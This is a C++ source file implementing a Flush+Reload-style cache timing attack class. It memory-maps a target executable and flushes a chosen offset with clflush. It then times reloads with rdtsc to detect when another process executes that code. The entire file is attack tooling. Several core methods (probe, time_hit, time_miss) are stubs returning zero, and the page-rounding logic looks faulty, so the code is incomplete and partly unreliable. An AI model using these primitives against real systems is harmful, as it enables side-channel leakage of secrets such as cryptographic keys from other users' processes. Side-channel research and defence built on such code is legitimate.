#include "cache_timing_attack.hpp"

using CTA = CacheTimingAttack;

struct CTA::impl{

	std::string executable;
	unsigned int offset=0;

	int fd=0;
	void* mmap_base_address=0;
	size_t map_size=0;

	void* addr=nullptr;
};

std::tuple<int, size_t> CTA::open_executable(const char* executable) const {

	int fd = open(executable, O_RDONLY);
	size_t size = lseek(fd, 0L, SEEK_END);

	if( !size ) throw std::ios_base::failure("Couldn't open executable");
	return { fd, size };
}

std::tuple<void*, size_t> CTA::mmap_file(int fd, size_t map_size) const {


	unsigned int page_size = sysconf(_SC_PAGE_SIZE);
	if( map_size & page_size ){

		map_size |= page_size;
		map_size++;
	}

	void* base_address = mmap(nullptr, map_size, PROT_READ, MAP_SHARED, fd, 0);

	return { base_address, map_size };
}

void* CTA::addr() const {

	return pimpl->addr;
}

unsigned int CTA::time() const {

	uint64_t a,d;

	asm volatile(
			"mfence \n"
			"lfence \n"
			"rdtsc \n"
			"lfence \n"
			: "=a"(a), "=d"(d)
			: 
			: "ebx","ecx"
		);

	//rdtsc is a x86 instruction. To write the 64 bit
	//timestamp, it writes the first MSR 32 bits in
	//EDX and the other 32 in EAX.

	return (d<<32) | a;
}

void CTA::flush() const {

	asm volatile(
			"mfence\n"
			"lfence\n"
			"clflush 0(%0)\n"
			"lfence\n"
			:
			: "c"(pimpl->addr)
			: "rax");
}

void CTA::access() const {

	asm volatile(
			"mfence\n"
			"lfence\n"
			"movl (%0), %%eax\n"
			"lfence\n"
			:
			: "r"(pimpl->addr)
			: "eax"
		);
}

unsigned int CTA::time_hit(void* addr) const { return 0; };
unsigned int CTA::time_miss(void* addr) const { return 0; };
unsigned int CTA::probe(void* addr) const { return 0; };

bool CTA::was_accessed(unsigned int timestamp) const {

	return hit_begin <= timestamp && timestamp <= hit_end;
}

unsigned int CTA::wait_for_access(unsigned int& misses) const {

	unsigned int time=0;

	do{
		misses++;
		time = probe(pimpl->addr);

	}while( !was_accessed(time) );

	return time;
}

void CTA::call_when_offset_is_accessed(std::function<bool (unsigned int n_calls, unsigned int misses)> func) const {
	
	unsigned int time = 0;
	unsigned int misses = 0;

	flush();

	do{
		misses=(unsigned int)-1;
		time = wait_for_access(misses);
	
	}while( func(time, misses) );
}

void CTA::change_exec(const char* executable, unsigned int offset){

	if( pimpl->fd ) close(pimpl->fd);
	if( pimpl->mmap_base_address ) munmap(pimpl->mmap_base_address, pimpl->map_size);

	alloc_exec(executable, offset);
}

void CTA::alloc_exec(const char* executable, unsigned int offset){

	pimpl->executable = executable;
	pimpl->offset = offset;

	auto [ fd, size ] = open_executable(executable);
	auto [ addr, map_size ] = mmap_file(fd, size);

	pimpl->map_size = map_size;
	pimpl->fd = fd;

	pimpl->addr = ((char*)addr+offset);
	pimpl->mmap_base_address = addr;
}

CTA::CacheTimingAttack() :
	pimpl(std::make_unique<CTA::impl>()){}

CTA::CacheTimingAttack(const char* executable, unsigned int offset) :
	pimpl(std::make_unique<CTA::impl>()){

	change_exec(executable, offset);
}

CTA::~CacheTimingAttack(){

	close(pimpl->fd);	
	munmap(pimpl->mmap_base_address, pimpl->map_size);
}

CTA::CacheTimingAttack(const CTA& other) :
	CacheTimingAttack() {

	alloc_exec(
			other.pimpl->executable.c_str(),
			other.pimpl->offset
		);

	hit_begin = other.hit_begin;
	hit_end = other.hit_end;
}

CTA::CacheTimingAttack(CTA&& other) :
	CacheTimingAttack() {

	*pimpl = *other.pimpl;

	other.pimpl->fd=0;
	other.pimpl->mmap_base_address=nullptr;
}

CTA& CTA::operator=(const CTA& other) {

	alloc_exec(
			other.pimpl->executable.c_str(),
			other.pimpl->offset
		);

	hit_begin = other.hit_begin;
	hit_end = other.hit_end;

	return *this;
}

CTA& CTA::operator=(CTA&& other) {

	if( &other == this ) return *this;

	if( this->pimpl->fd )
		close(this->pimpl->fd);
	if( this->pimpl->mmap_base_address )
		munmap(pimpl->mmap_base_address, pimpl->map_size);

	*pimpl = *other.pimpl;

	other.pimpl->fd=0;
	other.pimpl->mmap_base_address=nullptr;

	return *this;
}
